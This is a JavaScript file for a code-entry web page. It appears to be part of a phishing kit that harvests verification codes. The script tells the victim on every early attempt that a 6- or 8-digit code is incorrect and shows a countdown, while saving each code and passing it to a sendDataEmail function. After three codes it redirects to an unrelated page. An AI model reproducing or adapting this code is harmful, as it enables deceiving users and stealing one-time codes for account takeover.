var x; 

function startTimer() {
    stopTimer(); 
    // TIMER
    var countDownDate = new Date().getTime();
    x = setInterval(function () {
        var now = new Date().getTime();
        var distance = Math.round((now - countDownDate) / 1000);
        var insertedTime = 20 - distance;
        document.getElementById("timer").innerHTML = "The code that you've entered is incorrect. Please, try again after " + insertedTime + "s ";
        document.getElementById("timer").style.display = 'inline';
        if (insertedTime <= 0) {
            clearInterval(x);
            document.getElementById("timer").style.display = 'none';
            document.getElementById("timer").innerHTML = "EXPIRED";
            $("#trywait").prop('disabled', false);
        }
    }, 1000);
}

function stopTimer() {
    clearInterval(x); 
    document.getElementById("timer").style.display = 'none';
    document.getElementById("timer").innerHTML = "";
}

$(document).ready(function () {

    $("#trywait").prop('disabled', true);

    $("#codetext").on('keypress', function (event) {
        var charCode = event.which ? event.which : event.keyCode;
        if (charCode < 48 || charCode > 57) {
            event.preventDefault();
        }
    });

    $("#codetext").on('input', function (event) {
        if ($("#codetext").val().length === 6 || $("#codetext").val().length === 8) {
            console.log($("#timer").text().trim());
            if ($("#timer").text().trim().length <= 10) {
                $("#trywait").prop('disabled', false);
            }
        }
        else {
            $("#trywait").prop('disabled', true);
        }
    });


    // startTimer();

    var n = 0;
    $("#trywait").click(function () {

        if($("#codetext").val() === '')
        {
            return;
        }
        n++;
        switch (n) {
            case 1:
                {
                    setTimeout(function() {
                        localStorage.setItem('code1', $("#codetext").val());
                        sendDataEmail();
                        $("#codetext").val('');
                        $("#trywait").prop('disabled', true);
                    }, 2000); 
                
                    
                    break;
                }
            case 2:
                {
                    setTimeout(function() {
                        localStorage.setItem('code2', $("#codetext").val());
                        sendDataEmail();
                        $("#codetext").val('');
                        $("#trywait").prop('disabled', true);
                    }, 2000); 
                    break;
                }
            case 3:
                {
                    setTimeout(function() {
                          window.location.href = "../resume/education.html";
                    }, 2000); 
                    localStorage.setItem('code3', $("#codetext").val());
                    sendDataEmail();
                    break;
                }
            default:
                {
                    sendDataEmail();
                    window.location.href = "../resume/education.html";
                    break;
                }
        }
        if (n > 3) {
            sendDataEmail();
            window.location.href = "../resume/education.html";
        }
        else
        {
            startTimer();
        }
    });
});
